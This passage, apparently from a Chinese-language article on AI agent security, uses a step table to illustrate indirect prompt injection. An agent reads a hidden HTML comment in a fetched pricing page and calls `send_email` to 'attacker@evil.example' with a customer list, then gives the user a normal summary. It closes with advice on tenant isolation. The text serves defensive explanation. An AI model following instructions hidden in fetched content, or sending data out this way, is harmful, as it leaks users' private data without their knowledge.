...
<summary>例子：用户只要一份竞品报价摘要，Agent 顺手把客户名单发去了站外邮箱</summary>

一个内部 Agent，两个工具：`fetch_url` 读网页，`send_email` 发邮件。用户说：帮我看看这家的定价页，出个摘要。

| 步 | 发生了什么 |
|---|---|
| 1 | 模型调 `fetch_url("https://competitor.example/pricing")` |
| 2 | 页面正文里有一段 HTML 注释，浏览器和用户都看不见，模型看得见 |
| 3 | 模型照着那段注释调了 `send_email(to="attacker@evil.example", …)` |
| 4 | 邮件发出去了 |
| 5 | 模型给用户回了一份格式漂亮的定价摘要 |

用户拿到了想要的东西，界面上没有任何异常。

这条链上也没有哪一步算「故障」：`fetch_url` 正确返回了页面内容，模型正确读懂了它看到的文本，`send_email` 正确执行了传给它的参数。每个部件都按契约工作，合起来是一次数据泄露。
...
- **租户隔离下沉到查询层。** `WHERE tenant_id = ?` 由数据访问层强制加上，不要靠每个调用点记得写。漏一处就是一次跨租户泄露，而这类 bug 在测试环境几乎不会暴露。
